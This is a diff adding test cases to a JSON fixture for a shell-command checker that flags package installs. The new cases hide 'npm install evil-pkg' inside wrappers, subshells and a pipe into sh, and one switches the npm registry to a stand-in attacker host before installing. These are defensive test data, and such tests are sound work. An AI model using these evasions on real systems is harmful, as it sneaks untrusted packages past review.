@@ -151,6 +151,71 @@
       "command": "node -e \"console.log(process.version)\"",
       "expect": "ignore",
       "why": "not a package manager"
+    },
+    {
+      "command": "if [ -f package.json ]; then npm install evil-pkg; fi",
+      "expect": "check",
+      "why": "an install inside if/then (M4 review)"
+    },
+    {
+      "command": "timeout 300 npm install evil-pkg",
+      "expect": "check",
+      "why": "a wrapper with a value (M4 review)"
+    },
+    {
+      "command": "bash -lc 'npm install evil-pkg'",
+      "expect": "check",
+      "why": "combined shell flags (M4 review)"
+    },
+    {
+      "command": "version=$(npm i evil-pkg)",
+      "expect": "check",
+      "why": "an install inside $(…) (M4 review)"
+    },
+    {
+      "command": "npm -C /repo/server install evil-pkg",
+      "expect": "check",
+      "why": "-C is --prefix (M4 review)"
+    },
+    {
+      "command": "npm upd",
+      "expect": "check",
+      "why": "npm accepts unique prefixes (M4 review)"
+    },
+    {
+      "command": "cd src && npm install",
+      "expect": "check",
+      "why": "npm installs into the project root, not src/ (M4 review)"
+    },
+    {
+      "command": "echo 'npm install evil-pkg' | sh",
+      "expect": "deny",
+      "why": "a script piped into a shell (M4 review)"
+    },
+    {
+      "command": "ls packages | xargs npm install",
+      "expect": "deny",
+      "why": "arguments croak cannot follow (M4 review)"
+    },
+    {
+      "command": "npm config set registry https://attacker.invalid/ && npm i evil-pkg",
+      "expect": "deny",
+      "why": "registry changed before installing (M4 review)"
+    },
+    {
+      "command": "npm audit fix",
+      "expect": "deny",
+      "why": "not checked yet (M4 review)"
+    },
+    {
+      "command": "cat > NOTES.md <<'EOF'\nRun npm install first.\nEOF",
+      "expect": "ignore",
+      "why": "a heredoc body is data"
+    },
+    {
+      "command": "bash scripts/build.sh && npm test",
+      "expect": "ignore",
+      "why": "a script file, not an install"
     }
   ]
 }
